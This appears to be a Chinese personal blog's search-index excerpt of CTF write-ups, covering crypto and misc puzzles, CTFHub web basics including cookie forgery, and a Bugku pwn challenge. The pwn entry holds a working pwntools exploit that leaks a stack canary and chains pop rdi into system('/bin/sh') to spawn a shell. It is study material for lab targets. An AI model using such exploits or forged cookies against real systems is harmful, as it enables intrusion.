+<h3 id="3-爱弹贝斯的Caesar"><a href="#3-爱弹贝斯的Caesar" class="headerlink" title="3.爱弹贝斯的Caesar"></a>3.爱弹贝斯的Caesar</h3><p>下载附件得到一个txt文件,内容为<code>S1dIRlJQezd1cl8yYWZqUmVfMWZfdW5lcV82Yl9ndTFheF8wNX0=</code> 根据题目”贝斯”和密文内容,猜测为base64编码,解码得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025154542804.png"
+                      alt="image-20211025154542804"
+                ><br> 发现又为一串密文,观察格式判断可能为凯撒密码,用工具枚举得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025154725298.png"
+                      alt="image-20211025154725298"
+                ></p>
+<h3 id="4-小羊跳栅栏"><a href="#4-小羊跳栅栏" class="headerlink" title="4.小羊跳栅栏"></a>4.小羊跳栅栏</h3><p>题目密文为:<code>XXJJUUSCETCF&#123;_WhEaLVCe0_MgEo_0TdO__T1i0m2e4&#125;</code>,根据题目提示猜测为栅栏密码, 用工具枚举到22得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025154922737.png"
+                      alt="image-20211025154922737"
+                ></p>
+<h3 id="5-d-￣▽￣-b"><a href="#5-d-￣▽￣-b" class="headerlink" title="5.d=(￣▽￣*)b"></a>5.d=(￣▽￣*)b</h3><p>下载附件,得到一个名为txt的文件.用notepad++打开的:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025155246508.png"
+                      alt="image-20211025155246508"
+                ><br> 发现是一堆符号组成的表情,我先到网上搜索表情密码,但是没有获得有效信息,后来不断搜索得知这种东西叫颜文字(知道这东西但用的不多,一时半会没想起来),于是又在网上搜了颜文字密码(aaencode),解密得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025155813049.png"
+                      alt="image-20211025155813049"
+                ></p>
+<h3 id="6-ROT全家桶"><a href="#6-ROT全家桶" class="headerlink" title="6.ROT全家桶"></a>6.ROT全家桶</h3><p>题目给出<code>z(wu#!LH9780h07eK4JC047;BN</code>这一串密文,根据题目提示,应该是ROT系列加密,而且不止一种,于是用工具进行解密: 首先我用ROT47解密得到<code>KWHFRP&#123;whfg_9_f6zcyr_cfjq&#125;</code>,以为接下来是凯撒密码,于是我拿去枚举,得到:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025160418568.png"
+                      alt="image-20211025160418568"
+                ><br> 将其填入flag,提示错误(黑人问号脸???), 然后仔细看了看我得到的这个flag,发现不能连成一句话,又想想题目,觉得应该不止一次ROT加密,于是又把上一步得到的字符串拿去ROT解密,接下来用ROT18解密试试:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025160737367.png"
+                      alt="image-20211025160737367"
+                ><br> 得到应该神似flag的字符串,拿去试试,成功</p>
+<h3 id="7-我emo了"><a href="#7-我emo了" class="headerlink" title="7.我emo了"></a>7.我emo了</h3><p>下载附件得emo.txt, 里面内容为<code>👏👁👌👊🐼🐺👲👜👤👦👖👦👥👣👰👖👫👟👩👜👜👖👛👜👚👦👛👠👥👞👖👤👜👫👟👦👛👪👴</code>,根据题目和文件名提示,猜测是一个与emoji有关的密码,去网上搜索,得到相关解密网站,解密得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025161103301.png"
+                      alt="image-20211025161103301"
+                ></p>
+<h3 id="8-calendar"><a href="#8-calendar" class="headerlink" title="8.calendar"></a>8.calendar</h3><p>下载附件得到一串字符串 <code>S21 F1 T12 T11 T22 M1 F1 M3</code>,根据题目提示,在网上搜索日历密码,发现以下解密方法:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025161803100.png"
+                      alt="image-20211025161803100"
+                ><br> 于是根据题中所给hint手动解密(失败好几次)得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025161849524.png"
+                      alt="image-20211025161849524"
+                ></p>
+<h3 id="9-给我的宝剑附个魔"><a href="#9-给我的宝剑附个魔" class="headerlink" title="9.给我的宝剑附个魔"></a>9.给我的宝剑附个魔</h3><p>下载附件解压为一张图片:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025161958159.png"
+                      alt="image-20211025161958159"
+                ><br> 开始想的是图片隐写(中间写图片隐写写迷了),好久后才发现这是道密码题,在网上搜索跟我的世界附魔方面有关的密码发现有个叫”标准银河字母”的东西:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025162329783.png"
+                      alt="image-20211025162329783"
+                ><br> 然后对照得到3串字符串,刚开始不知道哪一部分是flag,交了好几个也都错了,想了一会决定拿最后一句赌一把,最后一串大致为<code>flag is standard galaxy word</code>,于是拿<code>standard galaxy word</code>转大写包上XJUSEC{}交了,成功.</p>
+<hr>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><hr>
+<h3 id="1-你是为网络安全而生的"><a href="#1-你是为网络安全而生的" class="headerlink" title="1.你是为网络安全而生的"></a>1.你是为网络安全而生的</h3><p>关注公众号即可得到flag</p>
+<h3 id="2-眼见为虚"><a href="#2-眼见为虚" class="headerlink" title="2.眼见为虚"></a>2.眼见为虚</h3><p>下载附件得到一个压缩包,解压,又得到一个压缩包,再解压,得到一个flag.txt,打开即可得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025203118107.png"
+                      alt="image-20211025203118107"
+                ></p>
+<h3 id="3-签退"><a href="#3-签退" class="headerlink" title="3.签退"></a>3.签退</h3><p>打开题目所给网址填完问卷即可得到flag</p>
+<h3 id="4-谁会拒绝嘉然呢？"><a href="#4-谁会拒绝嘉然呢？" class="headerlink" title="4.谁会拒绝嘉然呢？"></a>4.谁会拒绝嘉然呢？</h3><p>下载文件名为zip的附件,根据文件名猜测是个zip压缩包,解压得到”谁会拒绝嘉然呢”文件夹:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025203540591.png"
+                      alt="image-20211025203540591"
+                ><br> 运行exe文件发现是个拼图游戏,根据题目以及里面图片的提示决定直接拼,将图片一张一张往word里拖慢慢拼,最后可以得到flag(当时没有保存实在是不想再拼一遍了)</p>
+<h3 id="5-你画我猜"><a href="#5-你画我猜" class="headerlink" title="5.你画我猜"></a>5.你画我猜</h3><p>下载文件解压,得到一个mrf结尾的文件,经过反复搜索确认(搜了好久),确定是个记录鼠标轨迹的文件,可以用相应的软件(下了好多软件,最终确认是MouseRecorder)打开复现鼠标轨迹:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025204022521.png"
+                      alt="image-20211025204022521"
+                ><br> 准备打开画图复现轨迹,但是软件总是报错,最后将Window change这一项删掉后就可以正常复现了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025225922662.png"
+                      alt="image-20211025225922662"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025204600748.png"
+                      alt="image-20211025204600748"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025204451999.png"
+                      alt="image-20211025204451999"
+                ></p>
+<h3 id="6-你究竟会不会看图片啊？"><a href="#6-你究竟会不会看图片啊？" class="headerlink" title="6.你究竟会不会看图片啊？"></a>6.你究竟会不会看图片啊？</h3><p>下载题目附件解压得到一个有密码的压缩包和一个二维码:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025205053058.png"
+                      alt="image-20211025205053058"
+                ><br> 扫描二维码得到一句”Do you know when Shanny’s birthday is”,得到关键信息-解压密码有可能是一个生日. 于是用c语言写了一个字典:</p>
+ <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span> </span></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">  <span class="built_in">freopen</span>(<span class="string">&quot;bar.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout); </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">01</span>;j&lt;=<span class="number">12</span>;j++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">31</span>;k++)&#123; </span><br><span class="line">      <span class="keyword">if</span>(j/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;j&lt;&lt;<span class="string">&quot;&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span>(k/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;k&lt;&lt;endl; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025230317616.png"
+                      alt="image-20211025230317616"
+                ><br> 然后用github上的zipcrack跑密码,得到密码为0308:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025230549981.png"
+                      alt="image-20211025230549981"
+                ><br> 输入密码解压得到两张图片猜测是图片隐写 用01editor打开,在第一张图片里发现<code>XJUSEC&#123;Y0u_h2ve_a1r2ady_XJUSEC&#123;w0w j1ng rucb5439345d8b014396&#125;</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025205858897.png"
+                      alt="image-20211025205858897"
+                ><br> 第二张里发现flag:<code>a1r2ady_sta1ted&#125;</code>:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025205956732.png"
+                      alt="image-20211025205956732"
+                ><br> 拼接得到flag: <code>XJUSEC&#123;Y0u_h2ve_a1r2ady_sta1ted&#125;</code></p>
+<h3 id="7-暗藏玄机的excel"><a href="#7-暗藏玄机的excel" class="headerlink" title="7.暗藏玄机的excel"></a>7.暗藏玄机的excel</h3><p>下载附件flag.xlsx,打开查看里面内容,发现几条重要信息:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025211438283.png"
+                      alt="image-20211025211438283"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025211507228.png"
+                      alt="image-20211025211507228"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025211614649.png"
+                      alt="image-20211025211614649"
+                ><br> 根据最后一个提示,我用01editor打开这个文件发现文件头为<code>50 4B 03 04</code>判断是个zip压缩包:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025211756918.png"
+                      alt="image-20211025211756918"
+                ><br> 解压得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025211958198.png"
+                      alt="image-20211025211958198"
+                ><br> 里面有很多文件,找了一会后发现几个信息:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025212701885.png"
+                      alt="image-20211025212701885"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025212346719.png"
+                      alt="image-20211025212346719"
+                ><br> 后来觉得开始excel里给的几个提示也许有用,一个是”表一少了什么,有什么东西看不见”,一个是”你不觉得表一中的嘉然很可爱吗”,觉得可能flag藏在这两个地方相关的文件里,于是notepad++打开几个相关的文件,发现了一些信息,如图:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025213252838.png"
+                      alt="image-20211025213252838"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025213302291.png"
+                      alt="image-20211025213302291"
+                ><br> 从这两个信息判断出这个图片一个隐藏了一个加密的zip的压缩包,把图片送进01editor搜索zip文件头<code>50 4B 03 04</code>文件头,发现:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025213500288.png"
+                      alt="image-20211025213500288"
+                ><br> 文件尾刚好也是<code>00 00 00 00</code>,确定是个zip压缩包,将<code>50 4B 03 04</code>及以下16进制代码另存为一个fffflag.zip:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025213719297.png"
+                      alt="image-20211025213719297"
+                ><br> 解压,密码在上面已获得,得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025213848528.png"
+                      alt="image-20211025213848528"
+                ></p>
+<hr>
+<h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><hr>
+<h3 id="1-找找flag"><a href="#1-找找flag" class="headerlink" title="1.找找flag?"></a>1.找找flag?</h3><p>根据题目提示访问Github搜索Ethe448,发现有一个hexo博客的项目,仔细看了看发现有个Secret(题目中的”小秘密”),打开得到两张图片:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025213925365.png"
+                      alt="image-20211025213925365"
+                ><br> 拼接二维码扫描得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025214136400.png"
+                      alt="image-20211025214136400"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025214232394.png"
+                      alt="image-20211025214232394"
+                ></p>
+]]></content>
+      <tags>
+        <tag>2021</tag>
+        <tag>Crypto</tag>
+        <tag>CTF</tag>
+        <tag>Misc</tag>
+        <tag>Osint</tag>
+        <tag>Pwn</tag>
+        <tag>Reverse</tag>
+        <tag>Web</tag>
+        <tag>XJUSEC</tag>
+        <tag>XJU新生赛</tag>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[CTFHub]302跳转</title>
+    <url>/2021/09/13/ctfhub302%E8%B7%B3%E8%BD%AC/</url>
+    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >CTFHub&gt;&gt;技能树&gt;&gt;Web&gt;&gt;Web前置技能&gt;&gt;HTTP协议&gt;&gt;302跳转 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>302重定向又称之为暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向（temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。 ——百度百科</p>
+<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>创建环境后打开链接,如图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/09/1631520377-image.png"
+                      alt="1631520377-image"
+                ></p>
+<p>首页(xxx&#x2F;index.html)写着 <strong>No Flag here</strong> ,接着我们打开审查元素(F12)看看点击 <strong>Give me Flag</strong>(xxx&#x2F;index.php) 链接会发生什么.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/09/1631520681-image.png"
+                      alt="1631520681-image"
+                ></p>
+<p>发现当我们点击 <strong>Give me Flag</strong>(xxx&#x2F;index.php) 时,页面又302重定向到index.html了.</p>
+<p>因此猜测,只要我们阻止index.php重定向到index.html就可以拿到Flag了</p>
+<p>这里我们利用curl默认不跟随重定向的特点来访问index.php</p>
+<p>打开终端,输入<code>curl http://challenge-1cf1be6da3e0df53.sandbox.ctfhub.com:10800/index.php</code> (网址根据自身情况输入)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/09/1631520277-image.png"
+                      alt="1631520277-image"
+                ></p>
+<p>成功拿到Flag</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+        <tag>CTFHub</tag>
+        <tag>Easy</tag>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[Bugku]canary</title>
+    <url>/2022/02/06/bugkucanary/</url>
+    <content><![CDATA[<h2 id="查看程序保护机制"><a href="#查看程序保护机制" class="headerlink" title="查看程序保护机制"></a>查看程序保护机制</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218164122140.png"
+                      alt="image-20220218164122140"
+                ></p>
+<p>发现打开了NX、Canary,结合本题题目可知本题主要是进行canary绕过</p>
+<h2 id="分析程序流程"><a href="#分析程序流程" class="headerlink" title="分析程序流程"></a>分析程序流程</h2><h3 id="首先运行一下程序"><a href="#首先运行一下程序" class="headerlink" title="首先运行一下程序"></a>首先运行一下程序</h3><p>输入<code>chmod +x pwn4</code>赋予pwn4执行的权限,然后<code>./pwn4</code>运行:</p>
+<p>提示输入名字(36个字符以内),继续</p>
+<p>提示输入一段message,继续</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218164839317.png"
+                      alt="image-20220218164839317"
+                ></p>
+<p>程序结束</p>
+<h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>接下来使用<code>objdump -d pwn4</code>命令进行反汇编,寻找段名找有意义的函数,找到了main函数和一个hint函数(提示函数?)</p>
+<h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>观察main函数发现canary保护</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218171700158.png"
+                      alt="image-20220218171700158"
+                ></p>
+<p>main函数的栈帧如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218172405955.png"
+                      alt="image-20220218172405955"
+                ></p>
+<p>输入的name一共占用0x240-0x210共48个字节,message占用0x240-0x8共520个字节,canary占用8个字节,两次输入均可输入0x300(768)个字节</p>
+<h4 id="hint函数"><a href="#hint函数" class="headerlink" title="hint函数"></a>hint函数</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218172709308.png"
+                      alt="image-20220218172709308"
+                ></p>
+<p>hint函数调用了system函数,gdb调试看看hint中的system执行了什么命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218172906933.png"
+                      alt="image-20220218172906933"
+                ></p>
+<p>hint函数执行了<code>echo sixsixsix</code>命令<code>x/s</code>命令表示以字符串的形式查看内存</p>
+<h2 id="pwn思路"><a href="#pwn思路" class="headerlink" title="pwn思路"></a>pwn思路</h2><p>程序共有两次输入,且都允许输入0x300(768)个字节,可以利用第一次输入泄漏出来canary的值</p>
+<p>然后构造payload利用第二次输入覆盖掉address获取shell.</p>
+<p>现在还有一个问题就是hint函数虽然调用了system但是并没有进行输出flag到操作或者让我们拿到shell,因为程序开启了NX保护,因此没办法在输入变量时构造shellcode,我们查一下看看程序有没有<code>/bin/sh</code>的字串.</p>
+<p>通过<code>strings pwn4</code>命令发现目标</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218174531839.png"
+                      alt="image-20220218174531839"
+                ></p>
+<p>接下来使用gef的<code>search-pattern /bin/sh</code>命令来查找<code>/bin/sh</code>的地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218175008668.png"
+                      alt="image-20220218175008668"
+                ></p>
+<p>在pwn4文件的0x601068发现了该字符串</p>
+<p>然后通过将该字符串作为参数传到system函数中即可获取shell</p>
+<p>传参可以使用rdi寄存器,我们通过gef的<code>ropper --search &#39;pop rdi&#39;</code>命令搜索一下程序中有没有<code>pop rdi</code>的命令:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220218180221472.png"
+                      alt="image-20220218180221472"
+                ></p>
+<p>在0x400963处发现<code>pop rdi</code>命令</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>python代码如下:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"><span class="comment">#f=remote(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">f.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">568</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">f.recvuntil(<span class="string">b&#x27;aaab&#x27;</span>)</span><br><span class="line">canary = f.recv(<span class="number">7</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\0&#x27;</span>+canary</span><br><span class="line"></span><br><span class="line">sh_address = <span class="number">0x601068</span></span><br><span class="line">system_address  = <span class="number">0x40080c</span></span><br><span class="line">poprdi_address = <span class="number">0x400963</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">520</span> + canary + p64(<span class="number">0</span>) + p64(poprdi_address) + p64(sh_address) + p64(system_address)</span><br><span class="line"></span><br><span class="line">f.send(payload)</span><br><span class="line">f.interactive()</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+        <tag>Easy</tag>
+        <tag>WriteUp</tag>
+        <tag>Bugku</tag>
+        <tag>Canary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[CTFHub]Cookie</title>
+    <url>/2021/09/18/ctfhubcookie/</url>
+    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >CTFHub&gt;&gt;技能树&gt;&gt;Web&gt;&gt;Web前置技能&gt;&gt;HTTP协议&gt;&gt;Cookie <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息. ——百度百科</p>
+<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>创建环境后打开链接,如图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/09/image-4-1024x286.png"
+                      alt="image-4-1024x286"
+                ></p>
+<p>网站提示”hello guest, only admin can get flag”,即只有admin才能获得flag.</p>
+<p>根据本体题目可以看出应该跟cookie有关,打开审查元素-Application(应用程序)-Storage(储存)查看cookie,如图:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/09/image-5-1024x516.png"
+                      alt="image-5-1024x516"
+                ></p>
+<p>可以看到cookie里有admin的字样,后面有个值为0的value,猜测将value的值修改为1即可伪造admin的身份拿到flag</p>
+<p>双击修改value值为1并刷新网页:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/09/image-6-1024x633.png"
+                      alt="image-6-1024x633"
+                ></p>
+<p>成功拿到Flag</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+        <tag>CTFHub</tag>
+        <tag>Easy</tag>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[CTFHub]xxx</title>
+    <url>/2021/09/18/ctfhubxxx/</url>
+    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >CTFHub&gt;&gt;技能树&gt;&gt;Web&gt;&gt;Web前置技能&gt;&gt;HTTP协议&gt;&gt;Cookie <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息. ——百度百科</p>
+<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2>]]></content>
+  </entry>
+  <entry>
+    <title>Hello, world!</title>
+    <url>/2021/09/09/hello-world/</url>
+    <content><![CDATA[<p>我的博客建成啦!!</p>
+<p>交换友链可以按以下格式给我发邮件(<a class="link"   href="mailto:tongxuguang23@icloud.com" >tongxuguang23@icloud.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)哦^ ^:</p>
+<p><strong>博客名:</strong> 这是名<br><strong>链接:</strong> <a class="link"   href="https://xxxx.xxx/" >https://xxxx.xxx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <tags>
+        <tag>友链</tag>
+        <tag>瞎bb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux系统下进行代理的方法</title>
+    <url>/2022/02/10/linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>有代理的需求的时候，Windows和Mac系统还好，Linux会有些麻烦。每次在网上搜就会浪费很多时间,因此在此记录一下Linux系统下进行代理的方法。</p>
+<h2 id="获取代理地址"><a href="#获取代理地址" class="headerlink" title="获取代理地址"></a>获取代理地址</h2><p>注:<br><strong>本文主要针对我已经有一台Windows主机开启Clash并允许lan的情况，并根据我自身的需求慢慢更新，地址请根据自身情况填写</strong></p>
+<p>clash配置如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220210151221245.png"
+                      alt="image-20220210151221245"
+                ></p>
+<p>开启Allow LAN，端口为7890</p>
+<h3 id="clash运行在本地"><a href="#clash运行在本地" class="headerlink" title="clash运行在本地"></a>clash运行在本地</h3><p>那么代理地址就为<code>http://127.0.0.1:7890</code></p>
+<h3 id="clash运行在宿主机，虚拟机需要代理"><a href="#clash运行在宿主机，虚拟机需要代理" class="headerlink" title="clash运行在宿主机，虚拟机需要代理"></a>clash运行在宿主机，虚拟机需要代理</h3><p>可以通过命令行等获取到宿主机的ip地址，windows下使用<code>ipconfig</code>，如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/02/image-20220210152155150.png"
+                      alt="image-20220210152155150"
+                ></p>
+<p>这里我们找到与虚拟机为同一个以太网适配器的IP地址，我这台的为<code>192.168.121.1</code>,那么虚拟机内所需要的代理地址为<code>http://192.168.121.1:7890</code></p>
+<h3 id="clash运行在其他主机上"><a href="#clash运行在其他主机上" class="headerlink" title="clash运行在其他主机上"></a>clash运行在其他主机上</h3><p>运行clash的主机需要能够被访问到(在同一个局域网内或者有外网ip)，代理地址为<code>http://ip:7890</code>(根据自身情况填写)</p>
+<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>代理地址写进环境变量后可以更方便地调用</p>
+<h2 id="终端代理"><a href="#终端代理" class="headerlink" title="终端代理"></a>终端代理</h2><p>终端输入以下命令</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://127.0.0.1:7890&quot;  </span><br><span class="line">export https_proxy=&quot;http://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>curl</strong>等命令会用到</p>
